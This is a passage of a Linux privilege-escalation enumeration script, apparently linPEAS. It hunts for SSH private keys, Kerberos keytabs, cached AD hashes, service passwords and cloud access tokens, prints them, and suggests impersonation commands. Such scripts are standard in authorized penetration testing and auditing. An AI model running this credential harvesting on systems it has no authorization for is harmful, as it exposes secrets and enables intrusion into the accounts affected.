    if ! [ "`echo \"$PSTORAGE_SSH\" | grep -E \"known_hosts$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "known_hosts"; fi; fi; printf "%s" "$PSTORAGE_SSH" | grep -E "known_hosts$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,known_hosts$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_SSH\" | grep -E \"authorized_hosts$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "authorized_hosts"; fi; fi; printf "%s" "$PSTORAGE_SSH" | grep -E "authorized_hosts$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,authorized_hosts$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_SSH\" | grep -E \"authorized_keys$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "authorized_keys"; fi; fi; printf "%s" "$PSTORAGE_SSH" | grep -E "authorized_keys$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,authorized_keys$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,command=.*,${SED_RED},g" | sed -${E} "s,from=[\w\._\-]+,${SED_GOOD},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_SSH\" | grep -E \"\.pub$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*.pub"; fi; fi; printf "%s" "$PSTORAGE_SSH" | grep -E "\.pub$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.pub$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "command=.*" | sed -${E} "s,command=.*,${SED_RED},g"; done; echo "";
fi


grep "PermitRootLogin \|ChallengeResponseAuthentication \|PasswordAuthentication \|UsePAM \|Port\|PermitEmptyPasswords\|PubkeyAuthentication\|ListenAddress\|ForwardAgent\|AllowAgentForwarding\|AuthorizedKeysFiles" /etc/ssh/sshd_config 2>/dev/null | grep -v "#" | sed -${E} "s,PermitRootLogin.*es|PermitEmptyPasswords.*es|ChallengeResponseAuthentication.*es|FordwardAgent.*es,${SED_RED},"

if ! [ "$SEARCH_IN_FOLDER" ]; then
  if [ "$TIMEOUT" ]; then
    privatekeyfilesetc=$(timeout 40 grep -rl '\-\-\-\-\-BEGIN .* PRIVATE KEY.*\-\-\-\-\-' /etc 2>/dev/null)
    privatekeyfileshome=$(timeout 40 grep -rl '\-\-\-\-\-BEGIN .* PRIVATE KEY.*\-\-\-\-\-' $HOMESEARCH 2>/dev/null)
    privatekeyfilesroot=$(timeout 40 grep -rl '\-\-\-\-\-BEGIN .* PRIVATE KEY.*\-\-\-\-\-' /root 2>/dev/null)
    privatekeyfilesmnt=$(timeout 40 grep -rl '\-\-\-\-\-BEGIN .* PRIVATE KEY.*\-\-\-\-\-' /mnt 2>/dev/null)
  else
    privatekeyfilesetc=$(grep -rl '\-\-\-\-\-BEGIN .* PRIVATE KEY.*\-\-\-\-\-' /etc 2>/dev/null) # If there is tons of files linpeas gets frozen here without a timeout
    privatekeyfileshome=$(grep -rl '\-\-\-\-\-BEGIN .* PRIVATE KEY.*\-\-\-\-\-' $HOME/.ssh 2>/dev/null)
  fi
else
  # If $SEARCH_IN_FOLDER lets just search for private keys in the whole firmware
  privatekeyfilesetc=$(timeout 120 grep -rl '\-\-\-\-\-BEGIN .* PRIVATE KEY.*\-\-\-\-\-' "$ROOT_FOLDER" 2>/dev/null)
fi

if [ "$privatekeyfilesetc" ] || [ "$privatekeyfileshome" ] || [ "$privatekeyfilesroot" ] || [ "$privatekeyfilesmnt" ] ; then
  echo ""
  print_3title "Possible private SSH keys were found!" | sed -${E} "s,private SSH keys,${SED_RED},"
  if [ "$privatekeyfilesetc" ]; then printf "$privatekeyfilesetc\n" | sed -${E} "s,.*,${SED_RED},"; fi
  if [ "$privatekeyfileshome" ]; then printf "$privatekeyfileshome\n" | sed -${E} "s,.*,${SED_RED},"; fi
  if [ "$privatekeyfilesroot" ]; then printf "$privatekeyfilesroot\n" | sed -${E} "s,.*,${SED_RED},"; fi
  if [ "$privatekeyfilesmnt" ]; then printf "$privatekeyfilesmnt\n" | sed -${E} "s,.*,${SED_RED},"; fi
  echo ""
fi
if [ "$certsb4_grep" ] || [ "$PSTORAGE_CERTSBIN" ]; then
  print_3title "Some certificates were found (out limited):"
  printf "$certsb4_grep\n" | head -n 20
  printf "$$PSTORAGE_CERTSBIN\n" | head -n 20
    echo ""
fi
if [ "$PSTORAGE_CERTSCLIENT" ]; then
  print_3title "Some client certificates were found:"
  printf "$PSTORAGE_CERTSCLIENT\n"
  echo ""
fi
if [ "$PSTORAGE_SSH_AGENTS" ]; then
  print_3title "Some SSH Agent files were found:"
  printf "$PSTORAGE_SSH_AGENTS\n"
  echo ""
fi
if ssh-add -l 2>/dev/null | grep -qv 'no identities'; then
  print_3title "Listing SSH Agents"
  ssh-add -l
  echo ""
fi
if gpg-connect-agent "keyinfo --list" /bye 2>/dev/null | grep "D - - 1"; then
  print_3title "Listing gpg keys cached in gpg-agent"
  gpg-connect-agent "keyinfo --list" /bye
  echo ""
fi
if [ "$writable_agents" ]; then
  print_3title "Writable ssh and gpg agents"
  printf "%s\n" "$writable_agents"
fi
if [ "$PSTORAGE_SSH_CONFIG" ]; then
  print_3title "Some home ssh config file was found"
  printf "%s\n" "$PSTORAGE_SSH_CONFIG" | while read f; do ls "$f" | sed -${E} "s,$f,${SED_RED},"; cat "$f" 2>/dev/null | grep -Iv "^$" | grep -v "^#" | sed -${E} "s,User|ProxyCommand,${SED_RED},"; done
  echo ""
fi
if [ "$hostsdenied" ]; then
  print_3title "/etc/hosts.denied file found, read the rules:"
  printf "$hostsdenied\n"
  cat " ${ROOT_FOLDER}etc/hosts.denied" 2>/dev/null | grep -v "#" | grep -Iv "^$" | sed -${E} "s,.*,${SED_GREEN},"
  echo ""
fi
if [ "$hostsallow" ]; then
  print_3title "/etc/hosts.allow file found, trying to read the rules:"
  printf "$hostsallow\n"
  cat " ${ROOT_FOLDER}etc/hosts.allow" 2>/dev/null | grep -v "#" | grep -Iv "^$" | sed -${E} "s,.*,${SED_RED},"
  echo ""
fi
if [ "$sshconfig" ]; then
  echo ""
  echo "Searching inside /etc/ssh/ssh_config for interesting info"
  grep -v "^#"  ${ROOT_FOLDER}etc/ssh/ssh_config 2>/dev/null | grep -Ev "\W+\#|^#" 2>/dev/null | grep -Iv "^$" | sed -${E} "s,Host|ForwardAgent|User|ProxyCommand,${SED_RED},"
fi
echo ""

if [ "$PSTORAGE_PAM_AUTH" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing PAM Auth Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_PAM_AUTH\" | grep -E \"pam\.d$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "pam.d"; fi; fi; printf "%s" "$PSTORAGE_PAM_AUTH" | grep -E "pam\.d$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,pam\.d$,${SED_RED},"; find "$f" -name "sshd" | while read ff; do ls -ld "$ff" | sed -${E} "s,sshd,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -Ev "^#|^@" | sed -${E} "s,auth|accessfile=|secret=|user,${SED_RED},g"; done; echo "";done; echo "";
fi


#-- SI) Passwords inside pam.d
pamdpass=$(grep -Ri "passwd"  ${ROOT_FOLDER}etc/pam.d/ 2>/dev/null | grep -v ":#")
if [ "$pamdpass" ] || [ "$DEBUG" ]; then
  print_2title "Passwords inside pam.d"
  grep -Ri "passwd"  ${ROOT_FOLDER}etc/pam.d/ 2>/dev/null | grep -v ":#" | sed "s,passwd,${SED_RED},"
  echo ""
fi

if [ "$PSTORAGE_NFS_EXPORTS" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing NFS Exports Files (limit 70)"
    nfsmounts=`cat /proc/mounts 2>/dev/null | grep nfs`; if [ "$nfsmounts" ]; then echo -e "Connected NFS Mounts: \n$nfsmounts"; fi
    if ! [ "`echo \"$PSTORAGE_NFS_EXPORTS\" | grep -E \"exports$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "exports"; fi; fi; printf "%s" "$PSTORAGE_NFS_EXPORTS" | grep -E "exports$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,exports$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "\W+\#|^#" | sed -${E} "s,insecure|rw|nohide,${SED_RED},g" | sed -${E} "s,no_root_squash|no_all_squash,${SED_RED_YELLOW},g"; done; echo "";
fi


#-- SI) Kerberos
kadmin_exists="$(command -v kadmin)"
klist_exists="$(command -v klist)"
kinit_exists="$(command -v kinit)"
if [ "$kadmin_exists" ] || [ "$klist_exists" ] || [ "$kinit_exists" ] || [ "$PSTORAGE_KERBEROS" ] || [ "$DEBUG" ]; then
  print_2title "Searching kerberos conf files and tickets"
  print_info "http://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-active-directory"

  if [ "$kadmin_exists" ]; then echo "kadmin was found on $kadmin_exists" | sed "s,$kadmin_exists,${SED_RED},"; fi
  if [ "$kinit_exists" ]; then echo "kadmin was found on $kinit_exists" | sed "s,$kinit_exists,${SED_RED},"; fi
  if [ "$klist_exists" ] && [ -x "$klist_exists" ]; then echo "klist execution"; klist; fi
  ptrace_scope="$(cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null)"
  if [ "$ptrace_scope" ] && [ "$ptrace_scope" -eq 0 ]; then echo "ptrace protection is disabled (0), you might find tickets inside processes memory" | sed "s,is disabled,${SED_RED},g";
  else echo "ptrace protection is enabled ($ptrace_scope), you need to disable it to search for tickets inside processes memory" | sed "s,is enabled,${SED_GREEN},g";
  fi
  
  (env || printenv) 2>/dev/null | grep -E "^KRB5" | sed -${E} "s,KRB5,${SED_RED},g"

  printf "%s\n" "$PSTORAGE_KERBEROS" | while read f; do
    if [ -r "$f" ]; then
      if echo "$f" | grep -q .k5login; then
        echo ".k5login file (users with access to the user who has this file in his home)"
        cat "$f" 2>/dev/null | sed -${E} "s,.*,${SED_RED},g"
      elif echo "$f" | grep -q keytab; then
        echo ""
        echo "keytab file found, you may be able to impersonate some kerberos principals and add users or modify passwords"
        klist -k "$f" 2>/dev/null | sed -${E} "s,.*,${SED_RED},g"
        printf "$(klist -k $f 2>/dev/null)\n" | awk '{print $2}' | while read l; do
          if [ "$l" ] && echo "$l" | grep -q "@"; then
            printf "$ITALIC  --- Impersonation command: ${NC}kadmin -k -t /etc/krb5.keytab -p \"$l\"\n" | sed -${E} "s,$l,${SED_RED},g"
            # kadmin -k -t /etc/krb5.keytab -p "$l" -q getprivs 2>/dev/null #This should show the permissions of each impersoanted user, the thing is that in a test it showed that every user had the same permissions (even if they didn't). So this test isn't valid
            # We could also try to create a new user or modify a password, but I'm not user if linpeas should do that
          fi
        done
      elif echo "$f" | grep -q krb5.conf; then
        ls -l "$f"
        cat "$f" 2>/dev/null | sed -${E} "s,default_ccache_name,${SED_RED},";
      elif echo "$f" | grep -q kadm5.acl; then
        ls -l "$f" 
        cat "$f" 2>/dev/null
      elif echo "$f" | grep -q sssd.conf; then
        ls -l "$f"
        cat "$f" 2>/dev/null | sed -${E} "s,cache_credentials ?= ?[tT][rR][uU][eE],${SED_RED},";
      elif echo "$f" | grep -q secrets.ldb; then
        echo "You could use SSSDKCMExtractor to extract the tickets stored here" | sed -${E} "s,SSSDKCMExtractor,${SED_RED},";
        ls -l "$f"
      elif echo "$f" | grep -q .secrets.mkey; then
        echo "This is the secrets file to use with SSSDKCMExtractor" | sed -${E} "s,SSSDKCMExtractor,${SED_RED},";
        ls -l "$f"
      fi
    fi
  done
  ls -l "/tmp/krb5cc*" "/var/lib/sss/db/ccache_*" "/etc/opt/quest/vas/host.keytab" 2>/dev/null || echo_not_found "tickets kerberos"
  klist 2>/dev/null || echo_not_found "klist"
  echo ""

fi

if [ "$PSTORAGE_FREEIPA" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing FreeIPA Files (limit 70)"
    ipa_exists="$(command -v ipa)"; if [ "$ipa_exists" ]; then print_info "https://book.hacktricks.xyz/linux-hardening/freeipa-pentesting"; fi
    if ! [ "`echo \"$PSTORAGE_FREEIPA\" | grep -E \"ipa$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "ipa"; fi; fi; printf "%s" "$PSTORAGE_FREEIPA" | grep -E "ipa$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,ipa$,${SED_RED},"; find "$f" -name "default.conf" | while read ff; do ls -ld "$ff" | sed -${E} "s,default.conf,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$"; done; echo "";done; echo "";
    if ! [ "`echo \"$PSTORAGE_FREEIPA\" | grep -E \"dirsrv$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "dirsrv"; fi; fi; printf "%s" "$PSTORAGE_FREEIPA" | grep -E "dirsrv$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,dirsrv$,${SED_RED},"; find "$f" -name "id2rntry.db" | while read ff; do ls -ld "$ff" | sed -${E} "s,id2rntry.db,${SED_RED},"; done; echo "";done; echo "";
fi


if [ "$PSTORAGE_KNOCKD" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Knockd Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_KNOCKD\" | grep -E \"knockd.*$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "*knockd*"; fi; fi; printf "%s" "$PSTORAGE_KNOCKD" | grep -E "knockd.*$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,knockd.*$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$"; done; echo "";
fi


if [ "$PSTORAGE_KIBANA" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Kibana Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_KIBANA\" | grep -E \"kibana\.y.*ml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "kibana.y*ml"; fi; fi; printf "%s" "$PSTORAGE_KIBANA" | grep -E "kibana\.y.*ml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,kibana\.y.*ml$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "\W+\#|^#|^[[:space:]]*$" | sed -${E} "s,username|password|host|port|elasticsearch|ssl,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_ELASTICSEARCH" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Elasticsearch Files (limit 70)"
    echo "The version is $(curl -X GET '127.0.0.1:9200' 2>/dev/null | grep number | cut -d ':' -f 2)"
    if ! [ "`echo \"$PSTORAGE_ELASTICSEARCH\" | grep -E \"elasticsearch\.y.*ml$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "elasticsearch.y*ml"; fi; fi; printf "%s" "$PSTORAGE_ELASTICSEARCH" | grep -E "elasticsearch\.y.*ml$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,elasticsearch\.y.*ml$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -E "path.data|path.logs|cluster.name|node.name|network.host|discovery.zen.ping.unicast.hosts" | grep -Ev "\W+\#|^#"; done; echo "";
fi


##-- SI) Logstash
if [ "$PSTORAGE_LOGSTASH" ] || [ "$DEBUG" ]; then
  print_2title "Searching logstash files"
  printf "$PSTORAGE_LOGSTASH"
  printf "%s\n" "$PSTORAGE_LOGSTASH" | while read d; do
    if [ -r "$d/startup.options" ]; then
      echo "Logstash is running as user:"
      cat "$d/startup.options" 2>/dev/null | grep "LS_USER\|LS_GROUP" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN}," | sed -${E} "s,$nosh_usrs,${SED_BLUE}," | sed -${E} "s,$knw_usrs,${SED_GREEN}," | sed -${E} "s,$USER,${SED_LIGHT_MAGENTA}," | sed -${E} "s,root,${SED_RED},"
    fi
    cat "$d/conf.d/out*" | grep "exec\s*{\|command\s*=>" | sed -${E} "s,exec\W*\{|command\W*=>,${SED_RED},"
    cat "$d/conf.d/filt*" | grep "path\s*=>\|code\s*=>\|ruby\s*{" | sed -${E} "s,path\W*=>|code\W*=>|ruby\W*\{,${SED_RED},"
  done
fi
echo ""

#-- SI) Vault-ssh
if [ "$PSTORAGE_VAULT_SSH_HELPER" ] || [ "$DEBUG" ]; then
  print_2title "Searching Vault-ssh files"
  printf "$PSTORAGE_VAULT_SSH_HELPER\n"
  printf "%s\n" "$PSTORAGE_VAULT_SSH_HELPER" | while read f; do cat "$f" 2>/dev/null; vault-ssh-helper -verify-only -config "$f" 2>/dev/null; done
  echo ""
  vault secrets list 2>/dev/null
  printf "%s\n" "$PSTORAGE_VAULT_SSH_TOKEN" | sed -${E} "s,.*,${SED_RED}," 2>/dev/null
fi
echo ""

#-- SI) Cached AD Hashes
adhashes=$(ls "/var/lib/samba/private/secrets.tdb" "/var/lib/samba/passdb.tdb" "/var/opt/quest/vas/authcache/vas_auth.vdb" "/var/lib/sss/db/cache_*" 2>/dev/null)
if [ "$adhashes" ] || [ "$DEBUG" ]; then
  print_2title "Searching AD cached hashes"
  ls -l "/var/lib/samba/private/secrets.tdb" "/var/lib/samba/passdb.tdb" "/var/opt/quest/vas/authcache/vas_auth.vdb" "/var/lib/sss/db/cache_*" 2>/dev/null
  echo ""
fi

#-- SI) Screen sessions
if ([ "$screensess" ] || [ "$screensess2" ] || [ "$DEBUG" ]) && ! [ "$SEARCH_IN_FOLDER" ]; then
  print_2title "Searching screen sessions"
  print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions"
  screensess=$(screen -ls 2>/dev/null)
  screensess2=$(find /run/screen -type d -path "/run/screen/S-*" 2>/dev/null)
  
  screen -v
  printf "$screensess\n$screensess2" | sed -${E} "s,.*,${SED_RED}," | sed -${E} "s,No Sockets found.*,${C}[32m&${C}[0m,"
  
  find /run/screen -type s -path "/run/screen/S-*" -not -user $USER '(' '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')' 2>/dev/null | while read f; do
    echo "Other user screen socket is writable: $f" | sed "s,$f,${SED_RED_YELLOW},"
  done
  echo ""
fi

#-- SI) Tmux sessions
tmuxdefsess=$(tmux ls 2>/dev/null)
tmuxnondefsess=$(ps auxwww | grep "tmux " | grep -v grep)
tmuxsess2=$(find /tmp -type d -path "/tmp/tmux-*" 2>/dev/null)
if ([ "$tmuxdefsess" ] || [ "$tmuxnondefsess" ] || [ "$tmuxsess2" ] || [ "$DEBUG" ]) && ! [ "$SEARCH_IN_FOLDER" ]; then
  print_2title "Searching tmux sessions"$N
  print_info "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions"
  tmux -V
  printf "$tmuxdefsess\n$tmuxnondefsess\n$tmuxsess2" | sed -${E} "s,.*,${SED_RED}," | sed -${E} "s,no server running on.*,${C}[32m&${C}[0m,"

  find /tmp -type s -path "/tmp/tmux*" -not -user $USER '(' '(' -perm -o=w ')' -or  '(' -perm -g=w -and '(' $wgroups ')' ')' ')' 2>/dev/null | while read f; do
    echo "Other user tmux socket is writable: $f" | sed "s,$f,${SED_RED_YELLOW},"
  done
  echo ""
fi

if [ "$PSTORAGE_COUCHDB" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing CouchDB Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_COUCHDB\" | grep -E \"couchdb$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "couchdb"; fi; fi; printf "%s" "$PSTORAGE_COUCHDB" | grep -E "couchdb$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,couchdb$,${SED_RED},"; find "$f" -name "local.ini" | while read ff; do ls -ld "$ff" | sed -${E} "s,local.ini,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -Ev "^;" | sed -${E} "s,admin.*|password.*|cert_file.*|key_file.*|hashed.*|pbkdf2.*,${SED_RED},g"; done; echo "";done; echo "";
fi


if [ "$PSTORAGE_REDIS" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Redis Files (limit 70)"
    ( redis-server --version || echo_not_found "redis-server") 2>/dev/null
    if [ "`redis-cli INFO 2>/dev/null`" ] && ! [ "`redis-cli INFO 2>/dev/null | grep -i NOAUTH`" ]; then echo "Redis isn't password protected" | sed -${E} "s,.*,${SED_RED},"; fi
    if ! [ "`echo \"$PSTORAGE_REDIS\" | grep -E \"redis\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "redis.conf"; fi; fi; printf "%s" "$PSTORAGE_REDIS" | grep -E "redis\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,redis\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "\W+\#|^#" | sed -${E} "s,masterauth.*|requirepass.*,${SED_RED},g"; done; echo "";
fi


#-- SI) Dovecot
# Needs testing
dovecotpass=$(grep -r "PLAIN" /etc/dovecot 2>/dev/null)
if [ "$dovecotpass" ] || [ "$DEBUG" ]; then
  print_2title "Searching dovecot files"
  if [ -z "$dovecotpass" ]; then
    echo_not_found "dovecot credentials"
  else
    printf "%s\n" "$dovecotpass" | while read d; do
      df=$(echo $d |cut -d ':' -f1)
      dp=$(echo $d |cut -d ':' -f2-)
      echo "Found possible PLAIN text creds in $df"
      echo "$dp" | sed -${E} "s,.*,${SED_RED}," 2>/dev/null
    done
  fi
  echo ""
fi

if [ "$PSTORAGE_MOSQUITTO" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Mosquitto Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_MOSQUITTO\" | grep -E \"mosquitto\.conf$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "mosquitto.conf"; fi; fi; printf "%s" "$PSTORAGE_MOSQUITTO" | grep -E "mosquitto\.conf$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,mosquitto\.conf$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | grep -Ev "\W+\#|^#" | sed -${E} "s,password_file.*|psk_file.*|allow_anonymous.*true|auth,${SED_RED},g"; done; echo "";
fi


if [ "$PSTORAGE_NEO4J" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Neo4j Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_NEO4J\" | grep -E \"neo4j$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "neo4j"; fi; fi; printf "%s" "$PSTORAGE_NEO4J" | grep -E "neo4j$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,neo4j$,${SED_RED},"; find "$f" -name "auth" | while read ff; do ls -ld "$ff" | sed -${E} "s,auth,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";done; echo "";
fi


AWSVAULT="$(command -v aws-vault 2>/dev/null)"
if [ "$AWSVAULT" ] || [ "$DEBUG" ]; then
  print_2title "Check aws-vault"
  aws-vault list
fi

if [ "$PSTORAGE_CLOUD_CREDENTIALS" ] || [ "$DEBUG" ]; then
  print_2title "Analyzing Cloud Credentials Files (limit 70)"
    if ! [ "`echo \"$PSTORAGE_CLOUD_CREDENTIALS\" | grep -E \"credentials\.db$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "credentials.db"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_CREDENTIALS" | grep -E "credentials\.db$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,credentials\.db$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_CLOUD_CREDENTIALS\" | grep -E \"legacy_credentials\.db$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "legacy_credentials.db"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_CREDENTIALS" | grep -E "legacy_credentials\.db$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,legacy_credentials\.db$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_CLOUD_CREDENTIALS\" | grep -E \"adc\.json$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "adc.json"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_CREDENTIALS" | grep -E "adc\.json$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,adc\.json$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_CLOUD_CREDENTIALS\" | grep -E \"\.boto$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".boto"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_CREDENTIALS" | grep -E "\.boto$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.boto$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_CLOUD_CREDENTIALS\" | grep -E \"\.credentials\.json$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found ".credentials.json"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_CREDENTIALS" | grep -E "\.credentials\.json$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,\.credentials\.json$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_CLOUD_CREDENTIALS\" | grep -E \"firebase-tools\.json$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "firebase-tools.json"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_CREDENTIALS" | grep -E "firebase-tools\.json$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,firebase-tools\.json$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,id_token.*|access_token.*|refresh_token.*,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_CLOUD_CREDENTIALS\" | grep -E \"access_tokens\.db$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "access_tokens.db"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_CREDENTIALS" | grep -E "access_tokens\.db$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,access_tokens\.db$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_CLOUD_CREDENTIALS\" | grep -E \"access_tokens\.json$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "access_tokens.json"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_CREDENTIALS" | grep -E "access_tokens\.json$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,access_tokens\.json$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_CLOUD_CREDENTIALS\" | grep -E \"accessTokens\.json$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "accessTokens.json"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_CREDENTIALS" | grep -E "accessTokens\.json$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,accessTokens\.json$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
    if ! [ "`echo \"$PSTORAGE_CLOUD_CREDENTIALS\" | grep -E \"gcloud$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "gcloud"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_CREDENTIALS" | grep -E "gcloud$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,gcloud$,${SED_RED},"; find "$f" -name "*" | while read ff; do ls -ld "$ff" | sed -${E} "s,.*,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | grep -E "b'authorization'.*" | sed -${E} "s,b'authorization'.*,${SED_RED},g"; done; echo "";done; echo "";
    if ! [ "`echo \"$PSTORAGE_CLOUD_CREDENTIALS\" | grep -E \"legacy_credentials$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "legacy_credentials"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_CREDENTIALS" | grep -E "legacy_credentials$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,legacy_credentials$,${SED_RED},"; find "$f" -name "*" | while read ff; do ls -ld "$ff" | sed -${E} "s,.*,${SED_RED},"; cat "$ff" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,refresh_token.*|client_secret,${SED_RED},g"; done; echo "";done; echo "";
    if ! [ "`echo \"$PSTORAGE_CLOUD_CREDENTIALS\" | grep -E \"azureProfile\.json$\"`" ]; then if [ "$DEBUG" ]; then echo_not_found "azureProfile.json"; fi; fi; printf "%s" "$PSTORAGE_CLOUD_CREDENTIALS" | grep -E "azureProfile\.json$" | while read f; do ls -ld "$f" 2>/dev/null | sed -${E} "s,azureProfile\.json$,${SED_RED},"; cat "$f" 2>/dev/null | grep -IEv "^$" | sed -${E} "s,.*,${SED_RED},g"; done; echo "";
